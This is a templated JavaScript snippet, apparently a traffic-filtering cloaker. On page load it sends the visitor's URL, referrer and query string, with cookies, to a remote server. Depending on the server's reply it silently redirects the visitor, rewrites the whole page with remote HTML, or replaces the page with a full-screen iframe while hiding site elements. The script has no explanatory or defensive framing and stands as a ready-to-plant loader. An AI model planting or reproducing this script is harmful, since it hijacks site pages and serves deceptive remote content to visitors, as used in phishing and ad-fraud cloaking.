(async function() {
    const domain = '{DOMAIN}';
    const reason = '{REASON}';
    let url = `${domain}js/jsprocessing.php`;
    const params = new URLSearchParams();
    params.append('uri', window.location.href);
    const referrer = document.referrer;
    if (referrer) {
        params.append('referrer', referrer);
    }
    if (window.location.search) {
        params.append('search', window.location.search.substring(1));
    }
    if (reason) {
        params.append('reason', reason);
    }
    url += `?${params.toString()}`;

    try {
        const response = await fetch(url, { credentials: 'include' });
        if (!response.ok) {
            console.log(`An error occurred: ${response.status}`);
            return;
        }
        const action = response.headers.get('YWBAction');
        const responseBodyText = await response.text(); // Convert body to text

        switch (action) {
            case 'none':
                console.log('You are not allowed to go further!');
                return;
            case 'redirect':
                const loc = response.headers.get('YWBLocation');
                document.open();
                document.write(`
            <html>
                <head> 
                <meta name="referrer" content="never" /> 
                <meta http-equiv="refresh" content="0; url=${loc}" /> 
                </head>
            </html>`);
                document.close();
                break;
            case 'replace':
                const docText = !responseBodyText.includes('<base') ?
                    responseBodyText.replace('<head>', `<head><base href="${domain}"/>`) :
                    responseBodyText;
                document.open();
                document.write(docText);
                document.close();
                break;
            case 'iframe':
                const frameText = !responseBodyText.includes('<base') ?
                    responseBodyText.replace('<head>', `<head> <base href="${domain}"/>`) :
                    responseBodyText;
                showIframe(frameText);
                break;
        }
    } catch (error) {
        console.log(`An error occured: ${error}`);
    }
})();

function showIframe(html) {
    function hideElementDelayed(selector) {
        let interval = setInterval(function() {
            let element = document.querySelector(selector);
            if (element) {
                element.innerHTML = '';
                clearInterval(interval);
            }
        }, 820);
    }

    function appendElement(element) {
        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.border = '0';
        document.body.style.height = '100%';
        document.body.style.background = 'rgba(0,0,0,0)';
        document.querySelector('html').style.background = 'rgba(0,0,0,0)';
        document.body.appendChild(element);
        hideElementDelayed('#gtranslate_wrapper .switcher');
        hideElementDelayed('.ak-master-sales-pop');
        hideElementDelayed('.sticky');
    }

    let container = document.createElement('div');
    let iframe = document.createElement('iframe');
    iframe.setAttribute('srcdoc', html);
    iframe.style.border = '0';
    iframe.style.margin = '0';
    iframe.style.padding = '0 auto';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.overflow = 'hidden';

    container.style.border = '0';
    container.style.padding = '0';
    container.style.margin = '0 auto';
    container.style.width = '100%';
    container.style.height = '100vh';
    container.appendChild(iframe);

    if (document.body) {
        appendElement(container);
    } else {
        document.addEventListener('DOMContentLoaded', function() {
            appendElement(container);
        });
    }
}
